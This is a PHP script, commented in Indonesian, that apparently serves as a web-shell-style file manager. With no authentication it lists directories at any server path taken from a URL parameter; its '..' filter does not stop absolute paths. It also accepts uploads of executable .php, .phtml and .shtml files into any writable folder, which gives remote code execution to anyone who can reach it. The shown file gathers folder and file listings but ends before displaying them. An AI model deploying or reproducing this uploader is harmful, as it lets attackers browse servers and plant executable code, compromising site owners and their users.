<?php
declare(strict_types=1);

// Menentukan path awal dan path saat ini berdasarkan parameter GET
$script_dir = str_replace('\\', '/', __DIR__);
$current_path = isset($_GET['path']) ? str_replace(['..', '\\'], '', $_GET['path']) : $script_dir;

if (!is_dir($current_path)) {
    $current_path = $script_dir;
}
$current_path = rtrim($current_path, '/');

$extensions = [
    'pdf', 'shtml', 'phtml', 'txt',
    'jpg', 'jpeg', 'png', 'php'
];

$maxSize = 10 * 1024 * 1024;
$message = '';

// Proses Upload File
if (
    $_SERVER['REQUEST_METHOD'] === 'POST' &&
    isset($_FILES['file'])
) {
    $file = $_FILES['file'];

    if (!is_array($file['name'])) {
        $ext = strtolower(pathinfo(
            $file['name'],
            PATHINFO_EXTENSION
        ));

        if ($file['error'] !== UPLOAD_ERR_OK) {
            $message = 'Upload gagal. Error: ' . $file['error'];
        } elseif ($file['size'] > $maxSize) {
            $message = 'File maksimal 10 MB.';
        } elseif (!in_array($ext, $extensions, true)) {
            $message = 'Ekstensi file tidak diizinkan.';
        } elseif (!is_writable($current_path)) {
            $message = 'Folder tidak memiliki izin tulis.';
        } else {
            $newName = bin2hex(random_bytes(16)) . '.' . $ext;
            $destination = $current_path . '/' . $newName;

            if (move_uploaded_file(
                $file['tmp_name'],
                $destination
            )) {
                chmod($destination, 0600);
                $message = 'Upload berhasil: ' . $newName;
            } else {
                $message = 'Gagal menyimpan file.';
            }
        }
    }
}

// Baca daftar file dan folder
$items = scandir($current_path) ?: [];
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') {
        continue;
    }

    $fullPath = $current_path . '/' . $item;

    if (is_link($fullPath)) {
        continue;
    }

    if (is_dir($fullPath)) {
        $folders[] = $item;
    } elseif (is_file($fullPath)) {
        $files[] = $item;
    }
}

natcasesort($folders);
natcasesort($files);
?>
